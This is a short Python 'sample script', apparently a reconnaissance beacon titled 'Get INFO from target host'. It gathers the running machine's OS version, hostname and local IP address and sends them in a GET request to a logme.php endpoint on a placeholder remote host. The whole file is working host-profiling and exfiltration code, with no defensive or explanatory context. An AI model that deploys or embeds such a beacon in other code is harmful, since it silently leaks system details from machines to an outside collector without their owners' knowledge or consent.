###################################################################################################
#
# Get INFO from target host - Sample Script
# Author: Rocco <Sheliak> Sicilia
#
###################################################################################################

import platform
import json
import socket
import requests
import os

target_url = 'http://aaa.bbb.ccc.ddd' # my test host

### get platform info
os_ver = platform.platform()
# os_ver = os.popen("ver").read()

### get hostname
hostname = socket.gethostname()
# hostname = os.popen("hostname").read()

### get netinfo
local_ip = socket.gethostbyname(str(hostname))
# local_ip = os.popen("ipconfig | findstr Indirizzo").read()

### output
print("OS versione: \t{}".format(os_ver))
print("Hostname: \t{}".format(hostname))
print("Local IP: \t{}".format(local_ip))

### set data
data = {"os_ver":os_ver, "hostname":hostname, "local_ip":local_ip }
json = json.dumps(data)
print("####################\n# Debug: {}\n####################".format(json))

### send data
url = "{}/logme.php?os_ver={}&hostname={}&local_ip={}".format(target_url, os_ver, hostname, local_ip)
req = requests.get(url)
print(req.text)
